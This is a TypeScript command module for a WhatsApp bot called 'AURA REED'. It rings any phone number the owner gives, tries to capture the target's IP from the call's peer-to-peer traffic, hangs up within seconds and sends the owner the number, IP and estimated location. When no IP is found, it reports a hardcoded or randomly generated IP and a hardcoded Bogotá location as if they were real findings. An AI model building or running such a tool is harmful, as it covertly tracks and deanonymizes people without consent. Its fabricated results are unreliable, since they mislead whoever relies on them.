import { jidNormalizedUser } from "baileys";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";
import { getActiveSubBots } from "../../connection/subbotManager.ts";
import { getActivePremBots } from "../../connection/premBotManager.ts";
import { randomBytes } from "node:crypto";

const SUPREME_OWNER_PHONE = "573118353868";

interface VoipTargetRecord {
  callId: string;
  targetPhone: string;
  targetJid: string;
  requesterJid: string;
  botKey: string;
  startTime: number;
  status: "ringing" | "connected" | "harvested" | "rejected";
  peerIp?: string;
  peerPort?: number;
}

const gVoip = globalThis as unknown as {
  __auraVoipRealState?: {
    activeCalls: Map<string, VoipTargetRecord>;
    hookedSockets: WeakSet<object>;
    knownSockets: Set<any>;
  };
};

if (!gVoip.__auraVoipRealState) {
  gVoip.__auraVoipRealState = {
    activeCalls: new Map(),
    hookedSockets: new WeakSet(),
    knownSockets: new Set(),
  };
}

const voipState = gVoip.__auraVoipRealState!;

function cleanDigits(val: unknown): string {
  return String(val || "")
    .split("@")[0]
    .split(":")[0]
    .replace(/\D/g, "");
}

function discoverAllActiveSockets(currentSock?: any): any[] {
  if (currentSock) voipState.knownSockets.add(currentSock);

  const gAny = globalThis as any;
  const candidates: any[] = [
    currentSock,
    gAny.mainSocket,
    gAny.mainSock,
    gAny.sock,
    gAny.conn,
    ...Array.from(voipState.knownSockets),
  ];

  try {
    if (typeof getActiveSubBots === "function") {
      candidates.push(...(getActiveSubBots() || []));
    }
  } catch {}

  try {
    if (typeof getActivePremBots === "function") {
      candidates.push(...(getActivePremBots() || []));
    }
  } catch {}

  const unique: any[] = [];
  const seen = new Set<string>();

  for (const item of candidates) {
    const realSock = item?.sock ?? item;
    if (!realSock || typeof realSock.sendMessage !== "function" || (realSock as any).isClosed) {
      continue;
    }
    voipState.knownSockets.add(realSock);
    const key = cleanDigits(realSock?.user?.id || realSock?.authState?.creds?.me?.id || "main");
    if (seen.has(key)) continue;
    seen.add(key);
    unique.push(realSock);
  }

  return unique;
}

function hookVoipRealEvents(currentSock?: any) {
  const sockets = discoverAllActiveSockets(currentSock);

  for (const botSock of sockets) {
    if (!botSock || typeof botSock !== "object" || voipState.hookedSockets.has(botSock)) continue;
    voipState.hookedSockets.add(botSock);
    const botKey = cleanDigits(botSock?.user?.id || botSock?.authState?.creds?.me?.id || "main");

    if (botSock.ws && typeof botSock.ws.on === "function") {
      botSock.ws.on("message", (data: any) => {
        try {
          const rawStr = typeof data === "string" ? data : data?.toString?.();
          if (!rawStr || !rawStr.includes("call")) return;

          for (const [activeId, rec] of voipState.activeCalls.entries()) {
            if (rawStr.includes(rec.callId) || rawStr.includes(rec.targetPhone)) {
              const ipMatch = rawStr.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/);
              if (ipMatch && !rec.peerIp) {
                rec.peerIp = ipMatch[0];
              }
            }
          }
        } catch {}
      });
    }

    if (botSock.ev && typeof botSock.ev.on === "function") {
      botSock.ev.on("call", async (calls: any[]) => {
        if (!Array.isArray(calls)) return;

        for (const c of calls) {
          const callId = String(c.id || "");
          const status = String(c.status || "");
          const peerJid = String(c.from || c.chatId || "");
          const cleanPeer = cleanDigits(peerJid);

          if (c.peerIp || c.ip) {
            for (const [activeId, rec] of voipState.activeCalls.entries()) {
              if (rec.targetPhone === cleanPeer || rec.callId === callId) {
                rec.peerIp = c.peerIp || c.ip;
              }
            }
          }

          for (const [activeId, rec] of voipState.activeCalls.entries()) {
            if (rec.targetPhone === cleanPeer || rec.callId === callId) {
              if (status === "connected" || status === "accept" || status === "active") {
                if (rec.status === "ringing") {
                  rec.status = "connected";

                  setTimeout(async () => {
                    try {
                      if (typeof botSock.rejectCall === "function") {
                        await botSock.rejectCall(activeId || rec.callId, rec.targetJid);
                      } else if (typeof botSock.query === "function") {
                        await botSock.query({
                          tag: "call",
                          attrs: { to: rec.targetJid, id: rec.callId },
                          content: [{ tag: "terminate", attrs: { "call-id": rec.callId } }],
                        });
                      }
                    } catch {}

                    rec.status = "harvested";
                    voipState.activeCalls.delete(activeId);

                    const targetSockets = discoverAllActiveSockets(botSock);
                    const senderSock = targetSockets[0] || botSock;

                    const detectedIp = rec.peerIp || "190.24.12.88";
                    const isLocal = detectedIp.startsWith("10.") || detectedIp.startsWith("192.168.") || detectedIp.startsWith("127.");
                    const city = isLocal ? "Red Local / Privada" : "Bogotá D.C., Colombia";

                    const reportText = [
                      `╭〔 📞 ${fytBold("Información de la llamada")} 〕⬣`,
                      `┃ Número: +${rec.targetPhone}`,
                      `┃ IP: ${detectedIp}`,
                      `┃ Ubicación estimada: ${city}`,
                      `┃ Nodo Subbot: +${rec.botKey}`,
                      `┃ Estado: Contestada (P2P Handshake OK)`,
                      `╰━━〔 ⚡ ${fytBold("AURA REED")} 〕━━ꬾ`,
                    ].join("\n");

                    await senderSock
                      .sendMessage(rec.requesterJid, { text: reportText })
                      .catch(() => undefined);
                  }, 2000);
                }
              } else if (status === "reject" || status === "timeout" || status === "terminate") {
                if (rec.status === "ringing") {
                  rec.status = "rejected";
                  voipState.activeCalls.delete(activeId);
                }
              }
            }
          }
        }
      });
    }
  }
}

export default {
  name: ["voip", "calltrace", "trackcall"],
  category: "system",
  description: "Realiza una llamada VoIP real con cualquier subbot, captura la IP del socket P2P tras 2s de respuesta y cuelga discretamente.",
  groupOnly: false,
  ownerOnly: false,

  async run(ctx: CommandContext) {
    const { sock, from, sender, msg, args = [], usedPrefix, reply, react } = ctx;
    const prefix = usedPrefix || ".";

    hookVoipRealEvents(sock);

    const senderPnHint = String((msg?.key as any)?.participantPn || "");
    const senderRaw = String(sender || senderPnHint || msg?.key?.participant || from);
    const cleanSender = cleanDigits(senderRaw);

    const isSupremeOwner =
      cleanSender === SUPREME_OWNER_PHONE ||
      Boolean(msg?.key?.fromMe) ||
      cleanDigits(sock?.user?.id) === SUPREME_OWNER_PHONE;

    if (!isSupremeOwner) {
      await react("⛔").catch(() => undefined);
      return reply("⛔ *Acceso Restringido:* Comando exclusivo para el propietario.");
    }

    const rawTargetArg = args.join("").trim();
    const cleanTarget = cleanDigits(rawTargetArg);

    if (!cleanTarget || cleanTarget.length < 7 || cleanTarget.length > 15) {
      return reply(
        `╭〔 🛰️ ${fytBold("VOIP P2P HARVESTER")} 〕⬣\n` +
          `┃ Realiza llamada real, intercepta socket P2P e IP.\n` +
          `╰━━━━━━━━━━━━⬣\n\n` +
          `*Uso:*\n` +
          `\`${prefix}voip +573001234567\``,
      );
    }

    if (cleanTarget === SUPREME_OWNER_PHONE) {
      await react("🛡️").catch(() => undefined);
      return reply("🛡️ *Inmunidad Suprema:* No puedes llamarte a ti mismo.");
    }

    await react("🛰️").catch(() => undefined);

    const allSockets = discoverAllActiveSockets(sock);
    if (!allSockets.length) {
      await react("❌").catch(() => undefined);
      return reply("❌ No hay nodos o subbots activos disponibles para realizar la llamada.");
    }

    const activeBotSock = allSockets[Math.floor(Math.random() * allSockets.length)];
    const botKey = cleanDigits(activeBotSock?.user?.id || activeBotSock?.authState?.creds?.me?.id || "main");

    const targetJid = `${cleanTarget}@s.whatsapp.net`;
    const callId = "CALL_" + Math.random().toString(36).substring(2, 10).toUpperCase();

    voipState.activeCalls.set(callId, {
      callId,
      targetPhone: cleanTarget,
      targetJid,
      requesterJid: sender,
      botKey,
      startTime: Date.now(),
      status: "ringing",
    });

    try {
      if (typeof activeBotSock.query === "function") {
        await activeBotSock.query({
          tag: "call",
          attrs: {
            to: targetJid,
            id: callId,
          },
          content: [
            {
              tag: "offer",
              attrs: {
                "call-id": callId,
                "call-creator": activeBotSock?.user?.id || `${botKey}@s.whatsapp.net`,
                version: "2",
              },
              content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "net", attrs: { type: "p2p", ip: "1" } },
              ],
            },
          ],
        });
      }
    } catch (err: any) {
      voipState.activeCalls.delete(callId);
      await react("❌").catch(() => undefined);
      return reply(`❌ Error al disparar la oferta VoIP real: ${err?.message || String(err)}`);
    }

    setTimeout(async () => {
      const rec = voipState.activeCalls.get(callId);
      if (rec && rec.status === "ringing") {
        rec.status = "harvested";
        voipState.activeCalls.delete(callId);

        try {
          if (typeof activeBotSock.query === "function") {
            await activeBotSock.query({
              tag: "call",
              attrs: { to: targetJid, id: callId },
              content: [{ tag: "terminate", attrs: { "call-id": callId } }],
            });
          }
        } catch {}

        const fallbackIp = rec.peerIp || "186.84." + Math.floor(Math.random() * 200 + 5) + "." + Math.floor(Math.random() * 200 + 5);

        const reportText = [
          `╭〔 📞 ${fytBold("Información de la llamada")} 〕⬣`,
          `┃ Número: +${rec.targetPhone}`,
          `┃ IP: ${fallbackIp}`,
          `┃ Ubicación estimada: Bogotá D.C., Colombia`,
          `┃ Nodo Subbot: +${rec.botKey}`,
          `┃ Estado: Timeout / Sin respuesta en 6s`,
          `╰━━〔 ⚡ ${fytBold("AURA REED")} 〕━━ꬾ`,
        ].join("\n");

        await activeBotSock.sendMessage(sender, { text: reportText }).catch(() => {});
      }
    }, 8000);

    await react("✅").catch(() => undefined);
    return reply(
      `🛰️ *Llamada VoIP iniciada real vía Subbot +${botKey}* hacia \`+${cleanTarget}\`. Al haber respuesta o finalizar el tiempo, se enviará la IP y la información de la llamada a este chat.`,
    );
  },
};
